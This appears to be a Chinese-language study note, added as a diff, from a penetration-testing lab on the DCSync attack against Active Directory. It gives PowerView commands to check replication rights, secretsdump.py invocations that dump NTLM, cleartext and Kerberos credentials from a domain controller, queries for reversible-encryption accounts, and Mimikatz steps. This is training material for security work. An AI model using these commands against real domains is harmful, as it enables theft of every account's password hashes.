@@ -1,1 +1,53 @@
+DCSync 是一种窃取 Active Directory 密码数据库的技术
+它利用内置的目录复制服务远程协议 (Directory Replication Service Remote Protocol)
+该协议被域控制器 (Domain Controller) 用于复制域数据
+这使得攻击者可以模拟域控制器来获取用户的 NTLM 密码哈希
+关键在于请求域控制器通过 DS-Replication-Get-Changes-All 扩展权限来复制密码
+这是 AD 中的一种扩展访问控制权限，允许复制机密数据
+必须控制一个拥有执行域复制权限的账户（即设置了“Replicating Directory Changes”和“Replicating Directory Changes All”权限的用户）
+默认情况下，域/企业管理员和默认的域管理员拥有此权限
+
+
+C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl      查看adunn信息，看objectsid
+C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
+        ? { ($_.ObjectAceType -match 'Replication-Get')} | 
+        ?{$_.SecurityIdentifier -match $sid} |
+        select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType |       查看adunn有无“Replicating Directory Changes”和“Replicating Directory Changes All”
+        fl
+如果对该用户拥有某些权限（例如 WriteDacl），也可以将此权限添加到一个受控制的用户上，执行 DCSync 攻击
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5      收集adunn的哈希，可能生成3以下文件
+      inlanefreight_hashes.ntds                NTLM
+      inlanefreight_hashes.ntds.cleartext      明文
+      inlanefreight_hashes.ntds.kerberos       kb密钥
+只想要 NTLM 哈希，可以使用 -just-dc-ntlm 标志
+指定 -just-dc-user <USERNAME> 来仅提取特定用户的数据
+-pwd-last-set（查看每个账户的密码最后更改时间）
+-history（如果想转储密码历史记录，这可能有助于离线密码破解或作为提供给客户的域密码强度指标的补充数据）
+-user-status 是另一个有用的标志，检查用户是否被禁用
+
+当用户账户上设置可逆加密 (reversible encryption)选项
+并不意味着密码以明文形式存储
+是使用 RC4 加密存储的
+解密它们所需的密钥存储在注册表（Syskey）中，并且可以由域管理员或同等权限者提取
+像 secretsdump.py 这样的工具，在作为域管理员或使用 DCSync 等攻击转储 NTDS 文件时，会解密任何使用可逆加密存储的密码
+如果在一个账户上禁用了此设置，用户需要更改其密码，才能使其以单向加密方式存储
+在启用此设置的账户上设置的任何密码都将使用可逆加密存储
+C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl            -band 128 就是设置了可逆密码
+            值	含义
+            1	SCRIPT（脚本）
+            2	ACCOUNTDISABLE（账户禁用）
+            8	HOMEDIR_REQUIRED（需要主目录）
+            16	LOCKOUT（锁定）
+            32	PASSWD_NOTREQD（不需要密码）
+            64	PASSWD_CANT_CHANGE（不能改密码）
+            128	ENCRYPTED_TEXT_PWD_ALLOWED（允许加密文本密码）
+            512	NORMAL_ACCOUNT（普通账户）
+            65536	DONT_EXPIRE_PASSWORD（密码永不过期）
+C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol      也可以用Powerview
+C:\htb> .\runas /netonly /user:INLANEFREIGHT\adunn powershell            也可以用 Mimikatz
+C:\htb> .\mimikatz.exe
+使用 Mimikatz
+必须针对一个特定的用户，比如内置管理员账户
+必须在拥有 DCSync 权限的用户的上下文中运行
 
